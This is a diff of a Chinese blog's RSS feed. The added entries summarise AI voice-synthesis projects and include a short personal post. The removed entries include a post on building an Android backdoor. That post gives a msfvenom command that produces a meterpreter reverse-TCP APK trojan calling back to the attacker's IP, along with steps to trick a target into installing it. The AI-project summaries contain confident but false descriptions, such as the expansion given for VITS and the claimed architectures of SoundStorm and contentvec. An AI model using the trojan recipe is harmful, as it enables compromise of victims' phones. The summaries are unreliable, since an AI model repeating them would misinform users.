+VITS是Voice Inverse Text-to-Speech的缩写，是一种端到端的声音合成方法。与传统的文本到语音（TTS）系统不同，VITS直接从声音信号到声音信号进行训练，
+跳过了中间的文本表示。这种方法可以更好地保留声音的特征和表达。
+
+结合两者，AR-VITS可能是一个结合了自回归模型和VITS方法的声音合成模型。它可能使用自回归模型来建模声音信号之间的时间依赖关系，
+并结合VITS的思想来直接从声音信号到声音信号进行训练和生成，从而实现更加自然和高质量的声音合成。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Github 项目 hifi-gan&lt;/strong&gt;  &lt;a href=&quot;https://github.com/jik876/hifi-gan&quot;&gt;GitHub地址：https://github.com/jik876/hifi-gan&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/RVC-Boss/GPT-SoVITS 的声码器。 
+
+HiFi-GAN 是一个基于生成对抗网络（GAN）的高保真度语音合成模型。以下是该项目的基本讲解：
+
+1. **目标**：
+HiFi-GAN旨在实现高保真度的语音合成，即生成具有高质量、高逼真度的语音信号，使其听起来与真实人类语音相似。
+
+1. **生成对抗网络（GAN）**：
+HiFi-GAN使用生成对抗网络（GAN）作为基础架构。GAN由两个主要部分组成：生成器（Generator）和判别器（Discriminator）。生成器负责生成高保真度的语音信号，
+而判别器则负责区分生成的语音信号和真实的语音信号。通过对抗训练的方式，生成器逐渐学习生成高质量的语音信号，而判别器则逐渐学习提高其鉴别能力。
+生成器是一个神经网络模型，它接收随机噪声作为输入，并尝试生成高保真度的语音信号。通常，生成器会使用深度卷积神经网络（CNN）或长短期记忆网络（LSTM）等结构来实现。
+判别器也是一个神经网络模型，它接收两种输入：真实语音信号和生成器生成的合成语音信号。判别器的目标是区分这两种输入，并尽可能准确地判断生成的语音信号是否与真实语音信号相似。
+
+1. **高保真度语音合成**：
+HiFi-GAN采用了一系列技术和创新，包括使用长短期记忆（LSTM）或卷积神经网络（CNN）作为生成器的结构，引入了自适应特征正则化（Adaptive Feature Regularization）
+等方法来提高合成语音的质量和逼真度。这些技术和方法帮助HiFi-GAN生成接近真实人类语音的高保真度语音信号。
+
+1. **训练和优化**：
+HiFi-GAN通过对真实语音数据进行训练，使用GAN的对抗训练方法来不断优化生成器和判别器的参数。训练过程中可能会使用一系列技巧和策略来提高模型的性能和收敛速度。
+
+1. **应用场景**：
+HiFi-GAN可以应用于多种语音合成和语音处理任务，包括语音合成、语音增强、语音转换等。它可以用于语音助手、语音合成系统、语音转文字等领域。
+
+通过以上讲解，你可以了解到HiFi-GAN是一个基于GAN的高保真度语音合成模型，它通过对抗训练的方式来生成高质量、高逼真度的语音信号，适用于多种语音处理和合成任务。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Github 项目 SoundStorm&lt;/strong&gt;  &lt;a href=&quot;https://github.com/yangdongchao/SoundStorm&quot;&gt;GitHub地址：https://github.com/yangdongchao/SoundStorm&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+https://github.com/RVC-Boss/GPT-SoVITS 的类GPT（AR）模型 https://github.com/yangdongchao/SoundStorm/tree/master/soundstorm/s1/AR。 
+
+SoundStorm是一个基于WaveNet的音频合成系统，它可以生成高质量的语音音频。以下是该项目的基本讲解：
+
+1. **WaveNet模型**：
+SoundStorm基于WaveNet模型，这是由DeepMind提出的一种深度生成模型，用于生成音频波形。WaveNet模型使用了深度卷积神经网络（CNN）结构，并且具有极高的参数效率，
+能够生成高质量、高保真度的音频信号。
+
+1. **自回归模型**：
+WaveNet是一种自回归模型，它通过条件概率分布来建模音频波形的生成过程。具体来说，模型通过已知的音频序列来预测下一个样本点的值，然后将其作为输入，依次生成整个音频波形。
+
+1. **音频合成**：
+SoundStorm使用WaveNet模型来进行音频合成。给定输入的音频特征（如语音文本、音乐谱、或其他表示），WaveNet模型可以生成对应的高保真度音频波形。
+
+1. **训练和优化**：
+训练SoundStorm模型通常需要大量的音频数据，并且可能需要花费大量的时间和计算资源。在训练过程中，模型会通过最小化生成音频与真实音频之间的差异来优化参数。
+
+1. **应用场景**：
+SoundStorm可以应用于多种音频合成任务，包括语音合成、音乐合成、声音效果生成等。它可以用于语音合成系统、音乐生成器、声音特效软件等领域。
+
+综上所述，SoundStorm是一个基于WaveNet的音频合成系统，利用WaveNet模型可以生成高质量、高保真度的音频波形，适用于多种音频合成任务。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Github 项目 chinese_speech_pretrain&lt;/strong&gt;  &lt;a href=&quot;https://github.com/TencentGameMate/chinese_speech_pretrain&quot;&gt;GitHub地址：https://github.com/TencentGameMate/chinese_speech_pretrain&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+https://github.com/RVC-Boss/GPT-SoVITS 的Hubert特征。 
+
+chinese_speech_pretrain是腾讯游戏助手团队开发的一个中文语音预训练模型库，旨在提供中文语音相关的预训练模型和工具。以下是该项目的基本讲解：
+
+1. **预训练模型**：
+chinese_speech_pretrain提供了一系列中文语音相关的预训练模型，包括语音识别（ASR）、语音合成（TTS）、语音情感识别等模型。
+这些预训练模型可以用于各种中文语音相关的任务和应用。
+
+1. **模型结构**：
+这些预训练模型可能基于深度学习技术，采用了各种不同的模型结构，如循环神经网络（RNN）、卷积神经网络（CNN）、自注意力机制（Self-Attention）等。
+每个模型可能针对特定的任务和应用场景进行了优化和调整。
+
+1. **数据集**：
+为了训练这些预训练模型，可能使用了大量的中文语音数据集进行训练。这些数据集可能包括语音识别数据、语音合成数据、语音情感数据等，覆盖了多种不同的语音场景和语音内容。
+
+1. **应用示例**：
+chinese_speech_pretrain可能提供了一些示例代码和应用案例，帮助用户理解和使用预训练模型。这些示例代码可以用来进行语音识别、语音合成、语音情感识别等任务的实际操作和测试。
+
+1. **开源社区**：
+该项目可能是一个开源项目，允许用户参与到模型的开发和改进中，也可以通过GitHub等平台向开发团队提出问题和反馈建议。
+
+综上所述，chinese_speech_pretrain是一个提供中文语音相关预训练模型和工具的开源项目，用户可以使用这些模型和工具来进行中文语音相关任务的研究和应用。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Github 项目 contentvec&lt;/strong&gt;  &lt;a href=&quot;https://github.com/auspicious3000/contentvec&quot;&gt;GitHub地址：https://github.com/auspicious3000/contentvec&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+https://github.com/RVC-Boss/GPT-SoVITS 的VC用的低音色特征。 
+
+contentvec 是一个用于内容建模的开源库，它提供了一种简单而强大的方法来将文本转换为向量表示。以下是该项目的基本讲解：
+
+1. **内容建模**：
+contentvec 的主要目标是将文本内容转换为向量表示，从而实现内容建模。这种向量表示可以捕获文本的语义和语境信息，使得文本可以被更好地理解和处理。
+
+1. **词向量化**：
+contentvec 可能使用了词向量化（Word Embedding）技术，将文本中的单词或短语映射到高维向量空间中。通过词向量化，单词之间的语义关系可以在向量空间中得到体现，
+从而可以进行更多的语义分析和推断。
+
+1. **模型结构**：
+contentvec 可能基于深度学习技术，采用了神经网络模型来学习文本的向量表示。这些模型可能包括循环神经网络（RNN）、卷积神经网络（CNN）、注意力机制（Attention）等结构，
+以实现对文本内容的抽象和表示。
+
+1. **训练数据**：
+为了训练内容向量模型，contentvec 可能使用了大量的文本数据进行训练。这些数据可能包括各种不同领域和类型的文本，例如新闻文章、社交媒体文本、电子书籍等，
+以覆盖尽可能多的语义和语境信息。
+
+1. **应用场景**：
+contentvec 的向量表示可以应用于多种文本相关的任务和应用，包括文本分类、情感分析、语义相似度计算、信息检索等。它可以用于搜索引擎、推荐系统、自然语言处理应用等领域。
+
+综上所述，contentvec 是一个用于内容建模的开源库，通过将文本转换为向量表示来捕获文本的语义信息，以应用于各种文本相关的任务和应用中。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Github 项目 fish-speech&lt;/strong&gt;  &lt;a href=&quot;https://github.com/fishaudio/fish-speech&quot;&gt;GitHub地址：https://github.com/fishaudio/fish-speech&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+https://github.com/RVC-Boss/GPT-SoVITS 的概率分布采样 https://github.com/fishaudio/fish-speech/blob/main/tools/llama/generate.py#L41。 
+
+fish-speech是一个基于Python的语音处理库，旨在提供简单易用的接口来进行语音信号的处理、分析和转换。以下是该项目的基本讲解：
+
+1. **功能特性**：fish-speech提供了一系列功能丰富的工具和方法，用于处理语音信号。这些功能包括语音信号的读取和写入、频谱分析、声音特征提取、语音转换、语音识别等。
+
+2. **支持格式**：fish-speech支持多种常见的语音文件格式，包括WAV、MP3、FLAC等，可以方便地读取和处理这些格式的语音文件。
+
+3. **API接口**：fish-speech提供了简单易用的API接口，使得用户可以轻松地调用各种功能来处理语音信号。这些接口设计简洁清晰，方便用户理解和使用。
+
+4. **应用示例**：该项目可能提供了一些示例代码和应用案例，帮助用户理解和使用fish-speech库。这些示例代码可以用来进行语音信号的处理、分析和转换，或者作为学习和参考的资源。
+
+5. **开源社区**：fish-speech是一个开源项目，允许用户参与到开发和改进中，也可以通过GitHub等平台向开发团队提出问题和反馈建议。
+
+综上所述，fish-speech是一个功能丰富的语音处理库，提供了简单易用的接口来进行语音信号的处理、分析和转换，适用于各种语音相关的应用和任务。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;在 Hugging Face 模型中心 chinese-roberta-wwm-ext-large&lt;/strong&gt;  &lt;a href=&quot;https://huggingface.co/hfl/chinese-roberta-wwm-ext-large&quot;&gt;GitHub地址：https://huggingface.co/hfl/chinese-roberta-wwm-ext-large&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+https://github.com/RVC-Boss/GPT-SoVITS 的中文BERT预训练特征。 
+
+https://huggingface.co/hfl/chinese-roberta-wwm-ext-large 是一个在 Hugging Face 模型中心提供的中文 RoBERTa 预训练模型，
+它基于 RoBERTa（Robustly optimized BERT approach）模型架构，并在中文语境下进行了预训练。以下是该模型的基本讲解：
+
+1. **RoBERTa 模型**：
+RoBERTa 是一个基于 BERT（Bidirectional Encoder Representations from Transformers）的改进模型，它采用了一系列优化策略来提升语言建模的性能和效果。
+RoBERTa 在预训练阶段采用了更大的数据集、更长的训练时间和更多的训练步骤，以及一些其他的技术改进，从而在各种 NLP 任务上取得了优秀的性能。
+
+2. **中文 RoBERTa 模型**：
+https://huggingface.co/hfl/chinese-roberta-wwm-ext-large 是一个专门针对中文语境进行预训练的 RoBERTa 模型。它使用了来自中文语料库的大量文本数据进行预训练，
+以学习中文语言的表示形式，并为各种中文 NLP 任务提供强大的特征表示。
+
+3. **模型架构**：
+该模型可能采用了 RoBERTa 的标准模型架构，包括多层的 Transformer 编码器（Transformer Encoder），每个编码器层由多头自注意力机制（Multi-Head Self-Attention）
+和前馈神经网络组成。通过多层的堆叠，模型能够捕获输入文本的丰富语义信息。
+
+4. **应用场景**：
+中文 RoBERTa 模型可以应用于各种中文自然语言处理任务，包括文本分类、命名实体识别、情感分析、语义理解、文本生成等。它可以作为预训练模型在下游任务上进行微调，
+也可以作为特征提取器来获取文本的表示形式。
+
+5. **开源社区支持**：
+该模型由 Hugging Face 提供，属于一个开源社区项目，用户可以通过 Hugging Face Transformers 库轻松地加载和使用该模型，
+并结合其他工具和库进行各种 NLP 任务的开发和实验。
+
+综上所述，https://huggingface.co/hfl/chinese-roberta-wwm-ext-large 是一个基于 RoBERTa 架构的中文预训练模型，适用于各种中文自然语言处理任务，
+并由 Hugging Face 提供支持和维护。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Gradio&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Gradio是一个Python库，用于构建快速的机器学习界面。它允许用户将机器学习模型快速部署为易于使用的交互式界面，无需编写任何前端代码。Gradio提供了简单的API，
+使得用户可以轻松地将模型部署为Web应用，以便用户可以通过浏览器与模型进行交互。
+
+Gradio支持各种类型的输入和输出，包括文本、图像、音频、视频等。用户可以使用Gradio来构建各种不同类型的机器学习应用，例如图像分类、目标检测、文本生成、语音识别等。
+
+Gradio提供了一个简单直观的界面，用户可以通过拖放或上传文件来输入数据，然后查看模型的预测结果。它还支持自定义界面布局、样式和交互逻辑，以满足不同应用的需求。
+
+总之，Gradio是一个方便易用的工具，可以帮助用户快速构建和部署机器学习模型的交互式界面，使得模型的应用和使用更加简单和直观。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;PyTorch&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PyTorch是一个用于机器学习和深度学习的开源Python库，它提供了灵活而强大的工具和接口，用于构建和训练各种类型的神经网络模型。以下是关于PyTorch的一些重要特点和功能：
+
+1. **动态计算图**：
+PyTorch使用动态计算图来表示神经网络模型，这意味着计算图是在运行时构建的，允许用户使用Python的控制流结构（如循环和条件语句）来定义复杂的计算图。
+
+2. **自动微分**：
+PyTorch提供了自动微分功能，可以自动计算神经网络模型中参数的梯度，从而实现反向传播算法进行模型训练。这使得构建和训练神经网络模型变得更加简单和高效。
+
+3. **模块化设计**：
+PyTorch的设计是模块化的，提供了丰富的模块和函数，包括各种类型的神经网络层、损失函数、优化器等，可以方便地构建和定制神经网络模型。
+
+4. **GPU加速**：
+PyTorch支持在GPU上进行计算，可以利用GPU的并行计算能力加速模型训练和推断过程。用户可以轻松地将模型和数据移动到GPU上进行计算，从而提高计算性能。
+
+5. **丰富的生态系统**：
+PyTorch拥有一个庞大而活跃的社区，提供了丰富的资源和工具，包括预训练模型、数据集、教程、论坛等，使得用户可以快速上手并加速开发过程。
+
+总的来说，PyTorch是一个强大而灵活的深度学习框架，具有动态计算图、自动微分、模块化设计、GPU加速等特点，适用于各种机器学习和深度学习任务。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+      <pubDate>Thu, 15 Feb 2024 00:00:00 +0800</pubDate>
+      <link>http://localhost:4000/2024/02/AI%E8%AF%AD%E9%9F%B3_%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/</link>
+      <guid isPermaLink="true">http://localhost:4000/2024/02/AI%E8%AF%AD%E9%9F%B3_%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/</guid>
+        
+      <category>技术_AI语音</category>
+        
+        
+    </item>
+    
+    <item>
+      <title>我的2023年终总结</title>
+      <description>&lt;h3 id=&quot;我好像失去了什么又似乎什么也没有拥有过&quot;&gt;我好像失去了什么，又似乎什么也没有拥有过。&lt;/h3&gt;
+&lt;p&gt;&lt;br /&gt; 
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;我好像失去了什么，又似乎什么也没有拥有过。&lt;br /&gt;
+我好像失去了什么，又似乎什么也没有拥有过。&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt;&lt;/p&gt;
+</description>
+      <pubDate>Mon, 01 Jan 2024 00:00:00 +0800</pubDate>
+      <link>http://localhost:4000/2024/01/%E6%88%91%E7%9A%842023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
+      <guid isPermaLink="true">http://localhost:4000/2024/01/%E6%88%91%E7%9A%842023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
+        
+      <category>人生</category>
+        
+        
+    </item>
     
     <item>
       <title>移动开发的未来</title>
@@ -298,7 +945,7 @@ chrome-extension, chrome, https, chrome-untrusted.
     </item>
     
     <item>
-      <title>AI语音</title>
+      <title>AI语音mac踩坑记</title>
       <description>&lt;h3 id=&quot;原来你需要的不是答案而是时间&quot;&gt;原来你需要的不是答案，而是时间。&lt;/h3&gt;
 
 &lt;p&gt;so-vits-svc是基于VITS的开源项目，VITS（Variational Inference with adversarial learning for end-to-end Text-to-Speech）是一种结合变分推理（variational inference）、标准化流（normalizing flows）和对抗训练的高表现力语音合成模型。&lt;/p&gt;
@@ -308,7 +955,7 @@ chrome-extension, chrome, https, chrome-untrusted.
 &lt;h2 id=&quot;踩坑记&quot;&gt;踩坑记&lt;/h2&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;模型训练需要英伟达显卡，大部分mac没有，我的mac配置很高，依然没有。（如果已经获得模型文件，去运行推理是没有问题的）&lt;/li&gt;
+  &lt;li&gt;模型训练需要英伟达显卡，我的mac配置很高，没有。（如果已经获得模型文件，去运行推理是没有问题的）&lt;/li&gt;
   &lt;li&gt;电脑配置低，或者像我一样没有英伟达显卡的可以使用（不推荐）google的colab。有一定技术门槛，需要懂程序代码；需要翻墙；虽然免费但是每天有使用时长限制，我在模型训练运行中就直接给我断了。&lt;/li&gt;
   &lt;li&gt;
     &lt;p&gt;人声伴奏分离不要使用 Spleeter，需要下载几个G的文件和模型，我使用后觉得效果很差。&lt;a href=&quot;https://vocalremover.org/&quot;&gt;https://vocalremover.org/&lt;/a&gt; 这个网站效果很好了，不用注册，简单易使用，几分钟搞定，如果想要专业点，使用UVR5 （Ultimate Vocal Remover），它目前是最优秀的人声伴奏分离工具之一，而且开源免费，开源地址：&lt;a href=&quot;https://github.com/Anjok07/ultimatevocalremovergui&quot;&gt;https://github.com/Anjok07/ultimatevocalremovergui&lt;/a&gt; ,windows和mac版本都有，也需要英伟达显卡，不过没有也可以用，就是差点意思。可以根据不同类型、乐器、背景音乐等去选择不同的算法，分离后的效果是不一样的，对于一般的歌曲来说差别似乎不是很大。需要时间去学习了解这个软件，追求高品质的同学要用它。这里有不错的介绍&lt;a href=&quot;https://www.bilibili.com/read/cv21997904&quot;&gt;最强 AI 人声伴奏分离工具 UVR5，更新5.5版本&lt;/a&gt;&lt;/p&gt;
@@ -348,21 +995,19 @@ chrome-extension, chrome, https, chrome-untrusted.
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget -P pretrain/ http://obs.cstcloud.cn/share/obs/sankagenkeshi/checkpoint_best_legacy_500.pt
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2023/05/AI语音/&quot;&gt; AI语音 &lt;/a&gt;&lt;br /&gt;
+&lt;p&gt;由于mac坑太多，且存在诸多不便，台式机安排上。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/20230516/1.jpg&quot; alt=&quot;&quot; width=&quot;45%&quot; /&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/20230516/2.jpg&quot; alt=&quot;&quot; width=&quot;45%&quot; /&gt;&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 </description>
       <pubDate>Tue, 16 May 2023 00:00:00 +0800</pubDate>
-      <link>http://localhost:4000/2023/05/AI%E8%AF%AD%E9%9F%B3/</link>
-      <guid isPermaLink="true">http://localhost:4000/2023/05/AI%E8%AF%AD%E9%9F%B3/</guid>
+      <link>http://localhost:4000/2023/05/AI%E8%AF%AD%E9%9F%B3mac%E8%B8%A9%E5%9D%91%E8%AE%B0/</link>
+      <guid isPermaLink="true">http://localhost:4000/2023/05/AI%E8%AF%AD%E9%9F%B3mac%E8%B8%A9%E5%9D%91%E8%AE%B0/</guid>
         
-      <category>技术</category>
+      <category>技术_AI语音</category>
         
         
     </item>
@@ -857,281 +1502,6 @@ X Y Z， X Y J, X Y K，X Y L，X Z J, X Z K，X Z L，X J K，X J L，X K L，Y
       <guid isPermaLink="true">http://localhost:4000/2023/01/%E6%96%97%E5%9C%B0%E4%B8%BB_%E8%A1%A5%E7%89%8C%E7%B3%BB%E5%88%97%E6%A6%82%E7%8E%87%E8%AE%A1%E7%AE%97/</guid>
         
       <category>斗地主中的排列组合分析</category>
-        
-        
-    </item>
-    
-    <item>
-      <title>我的2022年终总结</title>
-      <description>&lt;h3 id=&quot;如果重来一次你会把这段荒唐的时光略过去么&quot;&gt;如果重来一次，你会把这段荒唐的时光略过去么?&lt;/h3&gt;
-&lt;p&gt;&lt;br /&gt; 
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;我总是流离进夜色中，&lt;br /&gt;
-在安静的时光中恍惚，&lt;br /&gt;
-一次又一次的享受着忘我的境界，&lt;br /&gt;
-轮回，又一个轮回。&lt;/p&gt;
-
-&lt;p&gt;我不厌其烦的重复着，&lt;br /&gt;
-像极了时空的钟摆，&lt;br /&gt;
-梦着，清醒着，游离着，&lt;br /&gt;
-感动与自我感动，&lt;br /&gt;
-批评，反省，沉醉，&lt;br /&gt;
-编织美丽的世界，&lt;br /&gt;
-沉溺于梦境，献出幸福的笑声。&lt;/p&gt;
-
-&lt;p&gt;我痛恨世道的堕落，&lt;br /&gt;
-孤独且悲悯的控诉，&lt;br /&gt;
-以此为凭，&lt;br /&gt;
-享受着片段的生命。&lt;/p&gt;
-
-&lt;p&gt;我明白所处的境地，&lt;br /&gt;
-并非无能为力，&lt;br /&gt;
-而却依然无所为，&lt;br /&gt;
-深深的疲惫，釜底抽薪般。&lt;/p&gt;
-
-&lt;p&gt;时间啊时间，&lt;br /&gt;
-生命啊生命，&lt;br /&gt;
-你可曾知道你是如此的廉价，&lt;br /&gt;
-我微笑着表示歉意。&lt;/p&gt;
-
-&lt;p&gt;有所坚持，&lt;br /&gt;
-有所期待，&lt;br /&gt;
-有一点生活，&lt;br /&gt;
-有一点乐观，&lt;br /&gt;
-已所剩不多，&lt;br /&gt;
-会不会，&lt;br /&gt;
-付之东流，走向灭亡。&lt;/p&gt;
-
-&lt;p&gt;爆发吧，灭亡吧。&lt;br /&gt;
-悄悄是别离的笙箫，&lt;br /&gt;
-夏虫也为我沉默，&lt;br /&gt;
-沉默是今晚的康桥。&lt;/p&gt;
-
-&lt;p&gt;我心隐匿于黑暗。&lt;/p&gt;
-
-&lt;p&gt;你可知我心。&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-&lt;br /&gt; 
-转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2023/01/我的2022年终总结/&quot;&gt; 我的2022年终总结 &lt;/a&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-</description>
-      <pubDate>Sun, 01 Jan 2023 00:00:00 +0800</pubDate>
-      <link>http://localhost:4000/2023/01/%E6%88%91%E7%9A%842022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
-      <guid isPermaLink="true">http://localhost:4000/2023/01/%E6%88%91%E7%9A%842022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
-        
-      <category>人生</category>
-        
-        
-    </item>
-    
-    <item>
-      <title>刘写给清扬的信</title>
-      <description>&lt;h3 id=&quot;我搜寻程序的灵魂却找到一颗世上最滚烫的心&quot;&gt;我搜寻程序的灵魂，却找到一颗世上最滚烫的心。&lt;/h3&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;你那边阳光可好？&lt;/p&gt;
-
-&lt;p&gt;我这里光线有点暗，阴沉沉的。不过可喜的是，我已经适应了此时的天气。&lt;/p&gt;
-
-&lt;p&gt;我自困于无风之地。
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2022/12/刘写给清扬的信/&quot;&gt; 刘写给清扬的信 &lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-</description>
-      <pubDate>Tue, 06 Dec 2022 00:00:00 +0800</pubDate>
-      <link>http://localhost:4000/2022/12/%E5%88%98%E5%86%99%E7%BB%99%E6%B8%85%E6%89%AC%E7%9A%84%E4%BF%A1/</link>
-      <guid isPermaLink="true">http://localhost:4000/2022/12/%E5%88%98%E5%86%99%E7%BB%99%E6%B8%85%E6%89%AC%E7%9A%84%E4%BF%A1/</guid>
-        
-      <category>人生</category>
-        
-        
-    </item>
-    
-    <item>
-      <title>H系列 - Android 后门程序</title>
-      <description>&lt;h3 id=&quot;纵然时光相隔百年仍感你心近在咫尺&quot;&gt;纵然时光相隔百年，仍感你心近在咫尺。&lt;/h3&gt;
-
-&lt;h2 id=&quot;kali-linux利用msf入侵安卓手机&quot;&gt;Kali Linux利用MSF入侵安卓手机&lt;/h2&gt;
-
-&lt;p&gt;环境：kali Linux。&lt;br /&gt;
-靶机：One plus 6T。(验证了其它品牌手机或模拟器都可以)&lt;br /&gt;
-工具：msfvenom、msfconsole（Kali系统内置，利用漏洞生成后门软件）。&lt;/p&gt;
-
-&lt;h2 id=&quot;大致流程&quot;&gt;大致流程：&lt;/h2&gt;
-&lt;ol&gt;
-  &lt;li&gt;生成手机安装的木马文件 -&amp;gt; muma.apk.&lt;/li&gt;
-  &lt;li&gt;开启监听程序，监听靶机是否上钩。&lt;/li&gt;
-  &lt;li&gt;通过某些手段使靶机安装我们的木马文件，并点击打开。&lt;/li&gt;
-  &lt;li&gt;当靶机安装木马文件并点击后，监听程序便得到了响应，通过命令获取靶机信息。&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;go&quot;&gt;go&lt;/h2&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.启动kali系统，打开命令行。  
-
-2.su        -》 进入root模式。
-
-3.ifconfig      -》 查看内网IP，如图，我的IP是 192.168.0.114，备用。
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/posts/kaliMSF/1.png&quot; alt=&quot;&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4.msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.114 lport=3369 &amp;gt; muma.apk     
- -》  lhost是kali的IP；lport随便写一个没有被占用的端口号就可以，记住，后面有用到；文件名随便写，后缀是 .apk 就行。
- 如下图所示，此时木马文件已经生成，在 /home/kali  目录下。
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/posts/kaliMSF/2.png&quot; alt=&quot;&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;5.在 /home/kali 目录下找到生成的muma.apk文件。
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;img src=&quot;/images/posts/kaliMSF/3.png&quot; alt=&quot;&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;6. 我通过合法手段将木马文件安装在了我的测试机上。 
